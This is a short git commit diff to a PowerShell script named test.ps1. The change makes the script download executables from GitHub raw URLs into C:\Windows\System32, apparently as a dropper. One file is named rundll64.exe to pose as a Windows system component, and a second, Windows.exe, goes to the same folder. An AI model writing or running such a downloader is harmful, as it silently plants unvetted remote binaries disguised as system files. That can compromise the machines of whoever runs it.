eac6682904a0d58b67923b47224a6a9a337793a8
totowi <totowipro@gmail.com>
2025-12-31 08:43:16 +0100

    Change executable download URLs and paths
    Updated executable URLs and paths in the script.

--- test.ps1
+++ test.ps1
@@ -1,7 +1,17 @@
-$exeUrl = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
-$exePath = "C:\Windows\System32\Testaa.exe"
+$exeUrl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
+$exePath = "C:\Windows\System32\rundll64.exe"
 
 Write-Host "Downloading..." -ForegroundColor Cyan
+
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFileAsync($exeUrl, $exePath)
+
+while ($wc.IsBusy) {
+    Start-Sleep -Milliseconds 1000
+}
+
+$exeUrl = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
+$exePath = "C:\Windows\System32\Windows.exe"
 
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFileAsync($exeUrl, $exePath)
